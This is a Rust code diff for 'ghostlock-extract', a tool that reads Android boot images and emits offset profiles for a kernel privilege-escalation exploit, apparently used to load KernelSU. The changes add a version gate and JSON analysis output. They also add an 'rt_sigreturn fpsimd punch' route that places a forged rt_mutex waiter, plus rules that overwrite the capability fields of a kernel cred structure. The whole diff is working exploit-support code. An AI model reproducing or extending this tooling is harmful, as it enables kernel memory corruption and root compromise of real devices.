@@ -75,6 +75,9 @@ struct Cli {
     /// and print a report instead of offsets
     #[arg(long)]
     analysis: bool,
+    /// write the same analysis as JSON to this path (does not replace --out)
+    #[arg(long)]
+    analysis_json: Option<PathBuf>,
     /// working directory for payload extraction and temp files; defaults to
     /// the system temp dir (pass an app-writable dir when running on Android)
     #[arg(long)]
@@ -229,6 +232,47 @@ fn run(cli: &Cli) -> Result<i32> {
     }
 
     let boot = BootImage::load(&boot_path)?;
+
+    /* Version gate before any symbol recovery: below 5.10 there is no
+     * KernelSU late-load KMI, and kallsyms recovery on such images fails with
+     * an unrelated message. The app shows this reason instead of a parse error. */
+    if let Some(release) = boot.release() {
+        let mut parts = release.split('.');
+        let major = parts.next().and_then(|part| part.parse::<u32>().ok());
+        let minor = parts.next().and_then(|part| part.parse::<u32>().ok());
+        let too_old = matches!(major, Some(major) if major < 5)
+            || matches!((major, minor), (Some(5), Some(minor)) if minor < 10);
+        if too_old {
+            let message = "内核低于 5.10：KernelSU late-load 没有对应 KMI";
+            if cli.analysis || cli.analysis_json.is_some() {
+                let json = serde_json::json!({
+                    "tool": "ghostlock-extract",
+                    "release": &release,
+                    "kernel_major": major,
+                    "kernel_minor": minor,
+                    "punch": "none",
+                    "routes": [],
+                    "verdict": {"level": "unusable", "reasons": [message]},
+                })
+                .to_string();
+                if let Some(path) = cli.analysis_json.as_ref() {
+                    std::fs::write(path, &json)
+                        .map_err(|err| ExtractError::new(format!("cannot write analysis json: {err}")))?;
+                }
+                if cli.analysis {
+                    if let Some(out) = cli.out.as_ref() {
+                        std::fs::write(out, &json)
+                            .map_err(|err| ExtractError::new(format!("{err}")))?;
+                    } else {
+                        println!("{json}");
+                    }
+                }
+            }
+            eprintln!("error: {message} ({release})");
+            return Ok(2);
+        }
+    }
+
     let mut phys_source = "unset";
     let mut kernel_phys_load: Option<u64> = None;
     if let Some(xbl) = &xbl_path {
@@ -413,8 +457,11 @@ fn run(cli: &Cli) -> Result<i32> {
         eprintln!("warning: --route only affects --format conf; ignoring");
     }
 
-    if cli.analysis {
-        let analysis_report = analysis::build(analysis::Input {
+    /* One analysis pass feeds three consumers: --analysis, --analysis-json and
+     * the conf writer's route choice. Building it unconditionally keeps the
+     * verdict and the emitted profile from disagreeing. */
+    let analysis_report = if cli.analysis || cli.analysis_json.is_some() || cli.format == "conf" {
+        Some(analysis::build(analysis::Input {
             release: release.as_deref(),
             kernel: &boot.kernel,
             symbols: &symbols,
@@ -425,8 +472,25 @@ fn run(cli: &Cli) -> Result<i32> {
             phys_source,
             primitive,
             allow_disasm: !cli.no_disasm,
-        });
-        let text = analysis::render(&analysis_report);
+        }))
+    } else {
+        None
+    };
+
+    if let (Some(report), Some(path)) = (analysis_report.as_ref(), cli.analysis_json.as_ref()) {
+        std::fs::write(path, analysis::render_json(report))
+            .map_err(|err| ExtractError::new(format!("cannot write analysis json: {err}")))?;
+    }
+
+    if cli.analysis {
+        let report = analysis_report
+            .as_ref()
+            .ok_or_else(|| ExtractError::new("analysis report unavailable"))?;
+        let text = if cli.format == "json" {
+            analysis::render_json(report)
+        } else {
+            analysis::render(report)
+        };
         if let Some(out) = &cli.out {
             std::fs::write(out, text).map_err(|err| ExtractError::new(format!("{err}")))?;
         } else {
@@ -614,8 +678,20 @@ fn run(cli: &Cli) -> Result<i32> {
         // Candidate output: emit everything the image actually yielded and
         // leave the rest out. Whether the result is complete enough to run is
         // decided by the app's pre-execution validation, not here.
+        /* Our own route: the rt_sigreturn fpsimd punch. The profile keeps the
+         * multicast_waiter *slot* (that is the section the native encoder
+         * reads the waiter fields from) while the punch itself is selected at
+         * run time by GL_PUNCH=sigret. Emitting it here is what makes an
+         * on-device derivation usable on kernels where the official routes are
+         * infeasible. */
+        let sigret_punch = analysis_report
+            .as_ref()
+            .and_then(|report| report.sigret.as_ref())
+            .filter(|report| report.feasible)
+            .cloned();
         let route = match cli.route.as_deref() {
             Some(route) => Some(route.to_string()),
+            None if sigret_punch.is_some() => Some("multicast_waiter".to_string()),
             None => {
                 let paths =
                     analysis::probe_paths(&symbols, &boot.kernel, &rel_symbols, &sorted_offsets);
@@ -649,6 +725,26 @@ fn run(cli: &Cli) -> Result<i32> {
         if route.as_deref() == Some("multicast_waiter") {
             const MCAST_BUFFER_SIZE: u64 = 264;
             const RT_MUTEX_WAITER_PI_TREE_ENTRY: u64 = 0x18;
+            if let Some(report) = &sigret_punch {
+                let sigret = &report.geometry;
+                eprintln!(
+                    "info: sigret punch selected; waiter_off=0x{:x} \
+                     (D=0x{:x} - futex depth 0x{:x}), buffer=0x{:x}",
+                    sigret.waiter_off, sigret.d, sigret.waiter_depth, sigret.copy_size
+                );
+                let mut punch_geometry: Vec<(&'static str, i64)> = vec![
+                    ("waiter_off", sigret.waiter_off),
+                    ("buffer_size", sigret.copy_size as i64),
+                    ("compact_waiter", 1),
+                ];
+                if let Some(task) = struct_offsets.get("waiter_task").copied().flatten() {
+                    punch_geometry.push(("task_offset", task as i64));
+                }
+                if let Some(lock) = struct_offsets.get("waiter_lock").copied().flatten() {
+                    punch_geometry.push(("lock_offset", lock as i64));
+                }
+                geometry = punch_geometry;
+            } else {
             match multicast_waiter_off(
                 &boot.kernel,
                 &rel_symbols,
@@ -672,6 +768,7 @@ fn run(cli: &Cli) -> Result<i32> {
                     "warning: static multicast waiter_off derivation failed: {err}; \
                      keeping the proven 5.x constant"
                 ),
+            }
             }
         }
         match route.as_deref() {
@@ -719,6 +816,27 @@ fn run(cli: &Cli) -> Result<i32> {
                     Vec::new()
                 }
             }
+        } else if sigret_punch.is_some() {
+            /* sigret zero-fills the credential copy and writes only usage and
+             * caps, so the copy has to stop after the capability run: every
+             * pointer member past it then keeps the value the target cred
+             * already holds. Both calibrated sigret blobs use this shape. */
+            /* The capability run starts at cap_permitted: the three words
+             * written are permitted/effective/bset, exactly the pair the
+             * calibrated blobs fill (PHY110 0x30, PLW110 0x38) and one word
+             * more than starting at cap_inheritable, which the bounding set
+             * still needs. */
+            let caps_offset = btf
+                .as_ref()
+                .and_then(|btf| {
+                    btf.field("cred", "cap_permitted")
+                        .or_else(|| btf.field("cred", "cap_inheritable"))
+                })
+                .inspect(|offset| {
+                    eprintln!("info: cred.cap_permitted at 0x{offset:x} (BTF)");
+                })
+                .unwrap_or(0x30);
+            report::conf_cred_sigret(caps_offset)
         } else {
             report::conf_cred_6x()
         };
@@ -735,6 +853,11 @@ fn run(cli: &Cli) -> Result<i32> {
             symbols: &symbol_offsets,
             structs: &struct_offsets,
             route: route.as_deref(),
+            /* The route names the geometry family; the punch names the copy
+             * primitive that actually writes the fake waiter. A kernel whose
+             * sigret frame fits keeps the multicast geometry while the punch
+             * is sigret, and the credential rules follow the punch. */
+            punch: sigret_punch.is_some().then_some("sigret"),
             route_geometry: &geometry,
             cred: &cred,
             extra_offsets: &extra_offsets,
